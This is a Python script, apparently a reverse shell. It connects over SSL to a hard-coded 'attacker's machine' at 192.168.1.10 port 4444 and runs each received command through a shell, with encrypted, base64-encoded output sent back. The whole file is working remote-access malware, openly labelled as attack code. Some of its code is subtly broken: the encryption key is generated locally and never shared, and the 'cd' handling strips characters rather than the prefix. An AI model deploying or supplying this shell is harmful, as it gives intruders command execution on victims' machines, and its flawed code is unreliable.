import socket
import subprocess
import os
import ssl
import base64
from cryptography.fernet import Fernet

# Generate or load a symmetric encryption key (Fernet key)
# Save the key securely or retrieve it from a secure source
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Set the target IP and port to connect to (attacker's machine)
target_ip = '192.168.1.10'
target_port = 4444

def secure_send(connection, data):
    """Send data securely using encryption."""
    encrypted_data = cipher_suite.encrypt(data.encode())
    connection.sendall(encrypted_data)

def secure_receive(connection):
    """Receive encrypted data and decrypt it."""
    encrypted_data = connection.recv(1024)
    return cipher_suite.decrypt(encrypted_data).decode()

# Create a socket and wrap it with SSL for encrypted communication
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

try:
    # Connect to the attacker's machine with SSL encryption
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(s, server_hostname=target_ip)
    s.connect((target_ip, target_port))

    # Send an initial confirmation message (encrypted)
    secure_send(s, "Connection established with reverse shell.")

    # Begin receiving commands from the attacker and execute them
    while True:
        # Receive command from attacker
        command = secure_receive(s)
        
        # If the attacker sends 'quit', exit the shell
        if command.lower() == 'quit':
            secure_send(s, "Connection closing...")
            break
        
        # Execute the received command
        try:
            # Check for file system navigation commands and ensure they don't break the system
            if command.startswith('cd '):
                try:
                    os.chdir(command.strip('cd '))
                    secure_send(s, f"Changed directory to {os.getcwd()}")
                except FileNotFoundError as e:
                    secure_send(s, f"Error: {e}")
            else:
                # Execute general commands and capture output
                result = subprocess.run(command, shell=True, capture_output=True)
                output = result.stdout + result.stderr
                if output:
                    secure_send(s, base64.b64encode(output).decode())  # Send output in base64 encoding
                else:
                    secure_send(s, "No output or error occurred.")
        except Exception as e:
            secure_send(s, f"Execution error: {str(e)}")

    s.close()

except Exception as e:
    print(f"Connection failed: {str(e)}")
